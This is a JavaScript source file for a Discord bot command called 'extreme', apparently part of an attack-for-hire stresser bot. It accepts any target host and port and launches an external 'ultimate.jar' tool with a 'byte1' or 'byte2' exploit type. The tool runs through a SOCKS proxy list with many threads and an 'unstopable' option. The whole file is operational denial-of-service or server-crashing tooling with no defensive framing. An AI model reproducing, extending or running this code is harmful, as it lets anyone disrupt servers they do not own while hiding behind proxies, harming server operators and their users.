/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');
const Attack = require('../structure/attack.js');
const crashers = require('../functions/crashers.js');
const config = require('../jsons/config.json');
const Discord = require('discord.js');

module.exports = new Command({
    name: "extreme",
    description: "Exploit Extreme",
    permissions: "SEND_MESSAGES",
    disableOnAttack: true,
    slashCommandOptions: [{
        name: "host",
        type: Discord.ApplicationCommandOptionType.String,
        description: "Enter host or ip server",
        required: true
    }, {
        name: "type",
        description: "Type attack",
        type: Discord.ApplicationCommandOptionType.String,
        choices: [{
            name: 'byte1',
            value: 'byte1'
        }, {
            name: 'byte2',
            value: 'byte2'
        }], 
        required: true
    }, {
        name: "port",
        description: "Enter port server",
        type: Discord.ApplicationCommandOptionType.Number,
        required: false
    }, {
        name: "unstopable",
        description: "Unstopable testing",
        type: Discord.ApplicationCommandOptionType.Boolean,
        required: false
    }],
    async execute(client, args, interaction){
        let host = args.getString("host");
        let port = args.getNumber("port") || 0;
        const type = args.getString("type");
        const unstop = args.getBoolean("unstopable") || false;

        interaction.deferReply({fetchReply: true}).then((msg) => {
            const attack = new Attack({
                jaroptions: {
                    jarname: "ultimate.jar",
                    jarargs: `host=%HOST% port=%PORT% proxiesFile=proxies/socks_proxies.txt threads=${threads.extreme} attackTime=60 exploit=${type}`
                },
                client: client,
                interaction: interaction,
                msgID: msg.id,
                AttacksArray: client.attacks,
                method: "Extreme 💥",
                host: host,
                port: port,
                unstopable: unstop,
                ownerID: interaction.user.id
            })
    
            client.attacks.set(msg.id, attack);
        })
    }
});